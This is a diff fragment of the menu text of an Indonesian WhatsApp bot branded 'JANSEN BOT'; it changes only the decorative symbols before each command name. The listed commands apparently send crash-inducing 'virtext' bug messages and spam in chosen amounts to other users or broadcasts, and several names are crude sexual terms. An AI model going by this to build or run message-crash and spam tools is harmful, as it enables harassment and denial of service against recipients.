+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ahyangbetul [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢buttonkematian [ jumlah ]
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯BUG DJ✯ ݊⃟̥⃝̇݊⃟•
-┃𖠀⃟❍➢jansendj1 [ jumlah ]
-┃𖠀⃟❍➢jansendj2 [ jumlah ]
-┃𖠀⃟❍➢jansendj3 [ jumlah ]
-┃𖠀⃟❍➢jansendj4 [ jumlah ]
-┃𖠀⃟❍➢jansendj5 [ jumlah ]
-┃𖠀⃟❍➢jansendj6 [ jumlah ]
-┃𖠀⃟❍➢jansendj7 [ jumlah ]
-┃𖠀⃟❍➢jansendj8 [ jumlah ]
-┃𖠀⃟❍➢jansendj9 [ jumlah ]
-┃𖠀⃟❍➢jansendj10 [ jumlah ]
-┃𖠀⃟❍➢jansendj11 [ jumlah ]
-┃𖠀⃟❍➢jansendj12 [ jumlah ]
-┃𖠀⃟❍➢jansendj13 [ jumlah ]
-┃𖠀⃟❍➢jansendj14 [ jumlah ]
-┃𖠀⃟❍➢jansendj15 [ jumlah ]
-┃𖠀⃟❍➢jansendj16 [ jumlah ]
-┃𖠀⃟❍➢jansendj17 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj1 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj2 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj3 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj4 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj5 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj6 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj7 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj8 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj9 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj10 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj11 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj12 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj13 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj14 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj15 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj16 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendj17 [ jumlah ]
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯JADI BUG VIP✯ ݊⃟̥⃝̇݊⃟•
-┃𖠀⃟❍➢jadivirtext1 [Masukan text nya]
-┃𖠀⃟❍➢jadivirtext2 [Masukan text nya]
-┃𖠀⃟❍➢jadivirtext3 [Masukan text nya]
-┃𖠀⃟❍➢jadivirtext4 [Masukan text nya]
-┃𖠀⃟❍➢jadivirtext5 [Masukan text nya]
-┃𖠀⃟❍➢jadivirtext6 [Masukan text nya]
-┃𖠀⃟❍➢jadivirtext7 [Masukan text nya]
-┃𖠀⃟❍➢jadivirtext8 [Masukan text nya]
-┃𖠀⃟❍➢jadivirtext9 [Masukan text nya]
-┃𖠀⃟❍➢jadivirtext10 [Masukan text nya]
-┃𖠀⃟❍➢jadikatalog [reply sticker] jumlah
-┃𖠀⃟❍➢jaditroli [Masukan text nya]
-┃𖠀⃟❍➢jadijago [Masukan text nya]
-┃𖠀⃟❍➢jadidocu [Masukan text nya]
-┃𖠀⃟❍➢jadilokas [Masukan text nya]
-┃𖠀⃟❍➢jadibugsw [Masukan text nya]
-┃𖠀⃟❍➢jadipolling [Masukan text nya]
-┃𖠀⃟❍➢jadidarknes [Masukan text nya]
-┃𖠀⃟❍➢jadibuginvite [Masukan text nya]
-┃𖠀⃟❍➢jadibugbokep [Masukan text nya]
-┃𖠀⃟❍➢jadibugbutton [Masukan text nya]
-┃𖠀⃟❍➢jadibugpayment [Masukan text nya]
-┃𖠀⃟❍➢jadibug1 [Video Jadi Bug Audio]
-┃𖠀⃟❍➢jadibug2 [Video Jadi Bug Mp3]
-┃𖠀⃟❍➢jadibug3 [Audio Jadi Bug Vn]
-┃𖠀⃟❍➢jadibug4 [Sticker Jadi Bug Gambar]
-┃𖠀⃟❍➢jadibug5 [Gambar Jadi Bug Once] 
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext1 [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext2 [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext3 [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext4 [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext5 [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext6 [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext7 [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext8 [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext9 [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadivirtext10 [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadikatalog [reply sticker] jumlah
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jaditroli [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadijago [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadidocu [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadilokas [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibugsw [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadipolling [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadidarknes [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibuginvite [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibugbokep [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibugbutton [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibugpayment [Masukan text nya]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibug1 [Video Jadi Bug Audio]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibug2 [Video Jadi Bug Mp3]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibug3 [Audio Jadi Bug Vn]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibug4 [Sticker Jadi Bug Gambar]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jadibug5 [Gambar Jadi Bug Once] 
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯VIRTEXT✯ ݊⃟̥⃝̇݊⃟•
-┃𖠀⃟❍➢jansenvirtext1 [ jumlah ]
-┃𖠀⃟❍➢jansenvirtext2 [ jumlah ]
-┃𖠀⃟❍➢jansenvirtext3 [ jumlah ]
-┃𖠀⃟❍➢jansenvirtext4 [ jumlah ]
-┃𖠀⃟❍➢jansenvirtext5 [ jumlah ]
-┃𖠀⃟❍➢jansenvirtext6 [ jumlah ]
-┃𖠀⃟❍➢jansenvirtext7 [ jumlah ]
-┃𖠀⃟❍➢jansenvirtext8 [ jumlah ]
-┃𖠀⃟❍➢jansenvirtext9 [ jumlah ]
-┃𖠀⃟❍➢jansenvirtext10 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext1 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext2 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext3 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext4 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext5 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext6 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext7 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext8 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext9 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenvirtext10 [ jumlah ]
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯SPAM✯ ݊⃟̥⃝̇݊⃟•
-┃𖠀⃟❍➢inibutton [ jumlah ]
-┃𖠀⃟❍➢jatrol [ jumlah ]
-┃𖠀⃟❍➢cumadocu [ jumlah ]
-┃𖠀⃟❍➢testbutton [ jumlah ]
-┃𖠀⃟❍➢bully [ jumlah ]
-┃𖠀⃟❍➢waifu [ jumlah ]
-┃𖠀⃟❍➢cuddle [ jumlah ]
-┃𖠀⃟❍➢neko [ jumlah ]
-┃𖠀⃟❍➢cry [ jumlah ]
-┃𖠀⃟❍➢kiss [ jumlah ]
-┃𖠀⃟❍➢hug [ jumlah ]
-┃𖠀⃟❍➢lick [ jumlah ]
-┃𖠀⃟❍➢awoo [ jumlah ]
-┃𖠀⃟❍➢yeet [ jumlah ]
-┃𖠀⃟❍➢bite [ jumlah ]
-┃𖠀⃟❍➢lick [ jumlah ]
-┃𖠀⃟❍➢jansenkangbuttton [ jumlah ]
-┃𖠀⃟❍➢jansendelay [ jumlah ]
-┃𖠀⃟❍➢jansenstik [ jumlah ]
-┃𖠀⃟❍➢jansenbugie [ jumlah ]
-┃𖠀⃟❍➢buglokas [ jumlah ]
-┃𖠀⃟❍➢jansentod [ jumlah ]
-┃𖠀⃟❍➢jansenbokep [ jumlah ]
-┃𖠀⃟❍➢buginvite [ jumlah ] Pc
-┃𖠀⃟❍➢jansenha [ jumlah ]
-┃𖠀⃟❍➢jansenhi [ jumlah ]
-┃𖠀⃟❍➢jansenhu [ jumlah ]
-┃𖠀⃟❍➢jansenhe [ jumlah ]
-┃𖠀⃟❍➢jansenba [ jumlah ]
-┃𖠀⃟❍➢jansenbe [ jumlah ]
-┃𖠀⃟❍➢jansenbu [ jumlah ]
-┃𖠀⃟❍➢jansenbi [ jumlah ]
-┃𖠀⃟❍➢jansenca [ jumlah ]
-┃𖠀⃟❍➢jansenci [ jumlah ]
-┃𖠀⃟❍➢jansencu [ jumlah ]
-┃𖠀⃟❍➢jansenco [ jumlah ]
-┃𖠀⃟❍➢jansenpoll [ jumlah ]
-┃𖠀⃟❍➢jansentag [ jumlah ]
-┃𖠀⃟❍➢inibug [ jumlah ]
-┃𖠀⃟❍➢hiya [ jumlah ]
-┃𖠀⃟❍➢lokas [ jumlah ]
-┃𖠀⃟❍➢catalog [ jumlah ]
-┃𖠀⃟❍➢jansendocu [ jumlah ]
-┃𖠀⃟❍➢jansendaca [ jumlah ]
-┃𖠀⃟❍➢duc [ jumlah ]
-┃𖠀⃟❍➢ducu [ jumlah ]
-┃𖠀⃟❍➢jansentrol [ jumlah ]
-┃𖠀⃟❍➢jansentroli [ jumlah ]
-┃𖠀⃟❍➢jansentroli2 [ jumlah ]
-┃𖠀⃟❍➢jansentroli3 [ jumlah ]
-┃𖠀⃟❍➢jansenjhon2 [ jumlah ]
-┃𖠀⃟❍➢jansenjhon [ jumlah ]
-┃𖠀⃟❍➢jansenbutton [ jumlah ]
-┃𖠀⃟❍➢jansenkatalog [ jumlah ]
-┃𖠀⃟❍➢jansenducu [ jumlah ]
-┃𖠀⃟❍➢jansendaca [ jumlah ]
-┃𖠀⃟❍➢jansendraknes [ jumlah ]
-┃𖠀⃟❍➢jansenslebew [ jumlah ]
-┃𖠀⃟❍➢jansensu [ jumlah ]
-┃𖠀⃟❍➢jansentol [ jumlah ]
-┃𖠀⃟❍➢jansenmemek [ jumlah ]
-┃𖠀⃟❍➢jansencontol [ jumlah ]
-┃𖠀⃟❍➢jansentextv [ jumlah ]
-┃𖠀⃟❍➢jansengas [ jumlah ]
-┃𖠀⃟❍➢jansencrash [ jumlah ]
-┃𖠀⃟❍➢jansenlokas [ jumlah ]
-┃𖠀⃟❍➢jansenlokas2 [ jumlah ]
-┃𖠀⃟❍➢jansenkangbug [ jumlah ]
-┃𖠀⃟❍➢jansenkangbug1 [ jumlah ]
-┃𖠀⃟❍➢jansenbar [ jumlah ]
-┃𖠀⃟❍➢jansenoke [ jumlah ]
-┃𖠀⃟❍➢jansenewe [ jumlah ]
-┃𖠀⃟❍➢jansenngentod [ jumlah ]
-┃𖠀⃟❍➢jansenbug1 [ jumlah ]
-┃𖠀⃟❍➢jansenbug2 [ jumlah ]
-┃𖠀⃟❍➢jansenbug3 [ jumlah ]
-┃𖠀⃟❍➢jansenbug4 [ jumlah ]
-┃𖠀⃟❍➢jansenbug5 [ jumlah ]
-┃𖠀⃟❍➢jansenbug6 [ jumlah ]
-┃𖠀⃟❍➢jansenbug7 [ jumlah ]
-┃𖠀⃟❍➢jansencrash1 [ jumlah ]
-┃𖠀⃟❍➢jansencrash2 [ jumlah ]
-┃𖠀⃟❍➢jansencrash3 [ jumlah ]
-┃𖠀⃟❍➢jansencrash4 [ jumlah ]
-┃𖠀⃟❍➢jansencrash5 [ jumlah ]
-┃𖠀⃟❍➢jansencrash6 [ jumlah ]
-┃𖠀⃟❍➢jansencrash7 [ jumlah ]
-┃𖠀⃟❍➢jansens1 [ jumlah ]
-┃𖠀⃟❍➢jansens2 [ jumlah ]
-┃𖠀⃟❍➢jansens3 [ jumlah ]
-┃𖠀⃟❍➢jansens4 [ jumlah ]
-┃𖠀⃟❍➢jansens5 [ jumlah ]
-┃𖠀⃟❍➢jansens6 [ jumlah ]
-┃𖠀⃟❍➢jansens7 [ jumlah ]
-┃𖠀⃟❍➢jansens8 [ jumlah ]
-┃𖠀⃟❍➢jansens9 [ jumlah ]
-┃𖠀⃟❍➢jansens10 [ jumlah ]
-┃𖠀⃟❍➢jansens11 [ jumlah ]
-┃𖠀⃟❍➢crashar1 [ jumlah ]
-┃𖠀⃟❍➢crashar2 [ jumlah ]
-┃𖠀⃟❍➢crashar3 [ jumlah ]
-┃𖠀⃟❍➢crashar4 [ jumlah ]
-┃𖠀⃟❍➢crashar5 [ jumlah ]
-┃𖠀⃟❍➢crashar6 [ jumlah ]
-┃𖠀⃟❍➢crashar7 [ jumlah ]
-┃𖠀⃟❍➢crashar8 [ jumlah ]
-┃𖠀⃟❍➢crashar9 [ jumlah ]
-┃𖠀⃟❍➢crashar10 [ jumlah ]
-┃𖠀⃟❍➢crashar11 [ jumlah ]
-┃𖠀⃟❍➢crashar12 [ jumlah ]
-┃𖠀⃟❍➢crashar13 [ jumlah ]
-┃𖠀⃟❍➢crashar14 [ jumlah ]
-┃𖠀⃟❍➢crashar15 [ jumlah ]
-┃𖠀⃟❍➢crashar16 [ jumlah ]
-┃𖠀⃟❍➢crashar17 [ jumlah ]
-┃𖠀⃟❍➢crashar18 [ jumlah ]
-┃𖠀⃟❍➢crashar19 [ jumlah ]
-┃𖠀⃟❍➢crashar20 [ jumlah ]
-┃𖠀⃟❍➢spam [ Reply Pesan ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢inibutton [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jatrol [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cumadocu [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢testbutton [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bully [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢waifu [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cuddle [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢neko [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cry [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kiss [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢hug [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢lick [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢awoo [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢yeet [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bite [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢lick [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenkangbuttton [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendelay [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenstik [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbugie [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢buglokas [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentod [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbokep [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢buginvite [ jumlah ] Pc
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenha [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenhi [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenhu [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenhe [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenba [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbe [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbu [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbi [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenca [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenci [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencu [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenco [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenpoll [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentag [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢inibug [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢hiya [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢lokas [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢catalog [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendocu [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendaca [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢duc [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ducu [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentrol [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentroli [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentroli2 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentroli3 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenjhon2 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenjhon [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbutton [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenkatalog [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenducu [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendaca [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansendraknes [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenslebew [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensu [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentol [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenmemek [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencontol [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansentextv [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansengas [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenlokas [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenlokas2 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenkangbug [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenkangbug1 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbar [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenoke [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenewe [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenngentod [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug1 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug2 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug3 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug4 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug5 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug6 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansenbug7 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash1 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash2 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash3 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash4 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash5 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash6 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansencrash7 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens1 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens2 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens3 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens4 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens5 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens6 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens7 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens8 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens9 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens10 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansens11 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar1 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar2 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar3 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar4 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar5 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar6 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar7 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar8 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar9 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar10 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar11 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar12 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar13 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar14 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar15 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar16 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar17 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar18 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar19 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢crashar20 [ jumlah ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢spam [ Reply Pesan ]
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━╼⃟݊⃟̥⃝̇݊݊⃟ ✯BROADCAST✯ ݊⃟̥⃝̇݊⃟•
-┃𖠀⃟❍➢bugbctext [ Bug Text Broadcast ]
-┃𖠀⃟❍➢bugbcvideo [ Bug Video Broadcast ]
-┃𖠀⃟❍➢bugbcaudio [ Bug Audio Broadcast ]
-┃𖠀⃟❍➢bugbcimage [ Bug image Broadcast ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bugbctext [ Bug Text Broadcast ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bugbcvideo [ Bug Video Broadcast ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bugbcaudio [ Bug Audio Broadcast ]
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bugbcimage [ Bug image Broadcast ]
 ┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 *NOTE*
@@ -5352,18 +5392,18 @@ case 'soundbot': {
 if (isBan) throw sticBanLu(from)
 jansen.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━•[ SOUNDBOT MENU ] 
-┃𖠀⃟❍➢kal
-┃𖠀⃟❍➢ngakak
-┃𖠀⃟❍➢ketawa
-┃𖠀⃟❍➢awkwk
-┃𖠀⃟❍➢bang
-┃𖠀⃟❍➢nob
-┃𖠀⃟❍➢musik
-┃𖠀⃟❍➢mastah
-┃𖠀⃟❍➢slebew
-┃𖠀⃟❍➢cantik
-┃𖠀⃟❍➢kesel
-┃𖠀⃟❍➢ngeselin
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢kal
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ngakak
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ketawa
+┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢awkwk
